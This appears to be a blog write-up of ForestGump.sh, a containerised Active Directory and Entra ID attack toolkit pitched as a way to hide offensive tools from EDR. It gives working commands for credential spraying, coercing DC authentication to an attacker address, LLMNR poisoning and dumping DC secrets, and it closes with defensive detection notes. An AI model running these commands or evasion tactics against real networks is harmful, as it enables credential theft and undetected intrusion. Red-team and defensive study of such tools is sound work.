---
layout: attack
title: ForestGump.sh - Run Forrest Run through Active Directory
---

<img height="200" align="left" src="https://github.com/BenjiTrapp/ForestGump.sh/raw/main/static/hi_forest_gump.gif" >
[ForestGump.sh](https://github.com/BenjiTrapp/ForestGump.sh) is a containerized AD attack platform that packs the sharpest Active Directory and Entra ID attack tools into a single Docker image, served through a browser-based terminal. The concept is simple but effective: wrap your offensive tooling in a container so EDR solutions see a harmless `ttyd` process instead of Responder, secretsdump, or ntlmrelayx running underneath. Think of it as a paper bag around your offensive operations — the EDR sees the container, not what's inside.

## The Problem it Solves

Running tools like Impacket or Responder directly on a target machine is a guaranteed way to trigger endpoint detection. EDR agents like CrowdStrike or SentinelOne will flag known offensive binaries immediately. ForestGump.sh sidesteps this by running everything inside a container that exposes only a web terminal on port `7681`. The attack surface stays inside the container, and the host only sees a Docker process serving HTTP.

---

## Architecture & Deployment

The platform runs as a single container with `ttyd` as the entry point. It supports three deployment models:

```bash
# Host networking (recommended for AD work - raw socket access)
docker run -it --rm --name forestgump \
  -p 7681:7681 --net=host \
  --cap-add=NET_ADMIN --cap-add=SYS_ADMIN \
  ghcr.io/benjitrapp/forestgump.sh:latest

# Kubernetes deployment
kubectl apply -f https://raw.githubusercontent.com/benjitrapp/forestgump.sh/main/deploy/forestgump.yaml
kubectl port-forward forestgump-pod 7681:7681
```

Host networking is critical for tools that need raw socket access (Responder, Coercer, nxc). The `NET_ADMIN` and `SYS_ADMIN` capabilities grant the privileges needed for packet crafting and network manipulation.

---

## Tooling Arsenal

### On-Prem AD Tools

The container ships with a comprehensive set of AD attack tools:

| Tool | Purpose |
|------|---------|
| [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) | AD relationship ingestor for path analysis |
| [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) | Network execution across SMB, LDAP, WinRM |
| [Impacket](https://github.com/fortra/impacket) | Protocol-level AD attacks (secretsdump, ntlmrelayx, etc.) |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS/MDNS poisoning |
| [Coercer](https://github.com/p0dalirius/Coercer) | Windows authentication coercion |
| [certipy-ad](https://github.com/ly4k/Certipy) | ADCS abuse (ESC1-ESC11) |
| [bloodyAD](https://github.com/CravateRouge/bloodyAD) | AD privilege escalation via LDAP/SAMR |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | WinRM shell access |
| [DonPAPI](https://github.com/login-securite/DonPAPI) | Remote DPAPI credential dumping |
| [mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential extraction (binary included) |

### Entra ID / Azure AD Tools

| Tool | Purpose |
|------|---------|
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD exploration (roadrecon, roadlib, roadtx) |
| [EntraFalcon](https://github.com/CompassSecurity/EntraFalcon) | Entra ID enumeration & risk assessment |
| [TokenSmith](https://github.com/JumpsecLabs/TokenSmith) | Entra ID token generation |
| [Azure CLI](https://github.com/Azure/azure-cli) | Azure management plane access |

---

## Usage Examples

Once the container is running, open `http://localhost:7681` in a browser and start attacking:

```bash
# BloodHound enumeration - map the entire AD
bloodhound-python -d domain.local -u user -p Password123 -dc dc.domain.local -c all

# Spray credentials across a subnet
nxc smb 192.168.1.0/24 -u user -p Password123

# Coerce authentication from a DC
coercer coerce -d domain.local -u user -p Password123 --dc-ip 192.168.1.10 -l attacker-ip

# Poison LLMNR/NBT-NS on the wire
responder -I eth0 -wrf

# Dump secrets from a DC
secretsdump.py domain.local/admin:'Password123'@192.168.1.10
```

---

## Browser-Accessible RDP via noVNC

One of the more interesting features is browser-based RDP access. The container chains `Xvfb`, `xfreerdp`, `x11vnc`, and `noVNC` to render a full RDP desktop in a second browser tab on port `6080`:

```bash
# Launch browser-accessible RDP session
rdp-browser /v:192.168.1.100 /u:administrator /p:Password123 /cert:ignore

# Background session management
rdp-bg /v:192.168.1.100 /u:admin /p:Password123 /cert:ignore
rdp-ls          # List active sessions
rdp-stop 1234   # Kill session by PID
```

The pipeline works as follows:

```
Xvfb → xfreerdp → x11vnc → websockify/noVNC
```

Open `http://localhost:6080/vnc.html` to interact with the RDP session visually:

<p align="center">
<img src="https://github.com/BenjiTrapp/ForestGump.sh/blob/main/assets/rdp-screenshot.png?raw=true" >
</p>

---

## MITRE ATT&CK Mapping

ForestGump.sh enables techniques across multiple tactics:

| Tactic | Technique | Description |
|--------|-----------|-------------|
| Credential Access | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | LLMNR/NBT-NS Poisoning (Responder) |
| Credential Access | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | DCSync (secretsdump) |
| Credential Access | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Kerberoasting (Impacket/nxc) |
| Discovery | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Domain Account Discovery (BloodHound) |
| Lateral Movement | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Remote Desktop Protocol (xfreerdp) |
| Lateral Movement | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Windows Remote Management (Evil-WinRM) |
| Privilege Escalation | [T1649](https://attack.mitre.org/techniques/T1649/) | ADCS Abuse (certipy-ad) |
| Defense Evasion | [T1610](https://attack.mitre.org/techniques/T1610/) | Deploy Container (the platform itself) |

---

## Detection Considerations

From a defensive perspective, ForestGump.sh is interesting because the container-based approach shifts detection from endpoint to network:

- **Endpoint EDR** sees only Docker/container runtime processes — no known offensive binaries on disk
- **Network monitoring** remains the primary detection layer: LLMNR poisoning traffic, Kerberos ticket requests, LDAP queries, and SMB lateral movement are still visible on the wire
- **Container runtime security** (Falco, Sysdig) can detect the privileged container with `NET_ADMIN`/`SYS_ADMIN` capabilities
- **Port monitoring** for unusual listeners on 7681 (ttyd) and 6080 (noVNC) can flag operator presence

---

## References

- [ForestGump.sh GitHub Repository](https://github.com/BenjiTrapp/ForestGump.sh)
- [MITRE ATT&CK - Deploy Container (T1610)](https://attack.mitre.org/techniques/T1610/)
- [ttyd - Share your terminal over the web](https://github.com/tsl0922/ttyd)
- [noVNC - VNC client using HTML5](https://github.com/novnc/noVNC)
